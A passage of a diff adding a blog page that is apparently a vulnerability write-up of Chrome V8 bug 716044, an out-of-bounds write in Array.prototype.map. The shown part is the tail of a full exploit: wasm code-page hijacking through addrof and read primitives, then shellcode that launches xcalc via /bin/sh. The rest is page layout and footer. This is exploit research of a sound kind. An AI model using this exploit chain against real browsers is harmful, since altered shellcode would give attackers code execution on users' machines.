class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"><span class="keyword">let</span> f_addr = addrof(f) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f_addr ==&gt; 0x"</span>+f_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> share_info_addr = read(f_addr + <span class="number">0x20</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info ==&gt; 0x"</span>+share_info_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> code = read(share_info_addr + <span class="number">8</span>) - <span class="number">1</span> + <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">shellcode =[<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">82</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">37</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">52</span>,<span class="number">36</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">199</span>,<span class="number">192</span>,<span class="number">59</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">45</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">68</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">61</span>,<span class="number">58</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">120</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">oob_array[buf_offset] = conv.i2f(code);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; shellcode.length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    dataview.setUint8(i,shellcode[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/1.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/v8-exploit/" rel="tag"># v8_exploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/03/数字经济2019线下-v8-exploit/" rel="next" title="数字经济2019线下 v8 exploit">
+                <i class="fa fa-chevron-left"></i> 数字经济2019线下 v8 exploit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
+            
+              <p class="site-author-name" itemprop="name">ditto</p>
+              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获得一个OOB-Array"><span class="nav-number">3.</span> <span class="nav-text">获得一个OOB Array</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整exp"><span class="nav-number">4.</span> <span class="nav-text">完整exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ditto</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">55.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
